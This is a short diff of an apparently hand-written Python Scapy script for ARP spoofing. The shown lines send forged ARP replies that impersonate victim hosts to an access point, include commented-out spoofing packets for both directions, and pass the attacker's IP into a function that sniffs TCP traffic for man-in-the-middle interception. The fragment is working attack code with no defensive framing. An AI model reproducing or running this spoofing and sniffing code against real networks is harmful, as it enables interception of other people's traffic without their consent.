@@ -83,13 +83,15 @@ def arp():
 			sendp(Ether(dst=ap_mac, src=attacker_mac)/ARP(pdst=ap_ip, psrc=vip[v], hwdst=vmac[v], hwsrc=attacker_mac, op=2))
 			time.sleep(0.1)
 
+	middle_man(attacker_ip)
+
 # spoof_vic_pkt = Ether(src=attacker_mac,dst=vic_mac)/ARP(psrc=ap_ip, pdst=vic_ip,hwsrc=attacker_mac, op=2)	
 # 		sendp(spoof_vic_pkt)
 # 		spoof_ap_pkt = Ether(src=attacker_mac,dst=ap_mac)/ARP(psrc=vic_ip,pdst=ap_ip,hwsrc=attacker_mac,op=2)
 # 		sendp(spoof_ap_pkt)
 
 
-def middle_man():
+def middle_man(attacker_ip):
 	s = sniff(count=0, store=1, stop_filter = lambda x: x.haslayer(TCP), lfilter = lambda x: x.haslayer(TCP))
 	s.show()
 	dstport = s[0][TCP].sport
@@ -100,4 +102,4 @@ def middle_man():
 
 
 arp()
-middle_man()
+
